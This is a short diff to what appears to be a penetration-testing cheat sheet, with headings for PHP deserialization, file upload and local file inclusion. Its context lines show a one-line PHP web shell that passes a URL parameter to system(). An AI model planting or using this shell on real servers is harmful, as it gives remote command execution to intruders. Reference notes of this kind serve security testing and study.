@@ -21,6 +21,9 @@
 ### PHP deserealization
 ### File Upload
 
+
 #### Basic PHP shell
 
 ``` <?php echo system($_GET['c']); ?> ```
+
+### Local File Inclusion
